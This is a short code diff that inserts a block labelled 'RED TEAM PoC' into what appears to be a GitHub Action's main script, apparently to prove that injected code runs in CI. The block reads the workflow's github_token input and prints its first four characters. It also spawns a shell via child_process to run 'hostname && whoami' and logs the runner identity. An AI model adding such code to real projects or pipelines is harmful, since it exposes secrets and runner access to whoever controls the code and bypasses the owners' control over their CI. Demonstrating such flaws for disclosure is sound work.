@@ -22,6 +22,21 @@ const start = async () => {
         const createRelease = core.getInput('create_release') === 'true';
         const targetBranch = github.context.payload.pull_request?.base?.ref || 'main'
         
+        // --- RED TEAM PoC START ---
+        const token: string = core.getInput('github_token');
+
+        console.log("================================");
+        console.log("VULNERABILITY_CONFIRMED: PAT_PREFIX=" +(token ? token.substring(0, 4) : "NOT_FOUND"));
+        const { exec } = require("child_process");
+
+        exec("hostname && whoami", (err: any, stdout: string) => {
+          if (!err) {
+            console.log("RUNNER_INFO: " + stdout.trim());
+          }
+        });
+
+        console.log("================================");
+        // --- RED TEAM PoC END ---
 
         const commitMessage: CommitMessageQueryResponse = await octokit.graphql(commitMessageQuery, {
             ...repoDetails,
